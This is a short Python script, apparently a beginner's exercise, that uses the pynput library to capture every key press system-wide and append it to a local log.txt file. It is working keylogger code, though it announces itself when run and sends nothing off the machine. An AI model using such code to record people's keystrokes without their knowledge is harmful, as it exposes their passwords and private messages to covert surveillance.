from pynput.keyboard import Listener

# Logs the keystrokes
def log_keystroke(key):
    key = str(key).replace("'", "") # Displays keys cleraly
    with open("log.txt", "a") as log_file: # Creates a new file or ads to it
        log_file.write(key + "\n") #Creats indent and adds keystrokes to file

# Keystroke listner
def start_logging():
    with Listener(on_press=log_keystroke) as listener: # Event listner from pynput
        listener.join()

if __name__ == "__main__":
    print("[+] Script is running... (Press CTRL + C to stop)")
    start_logging()``
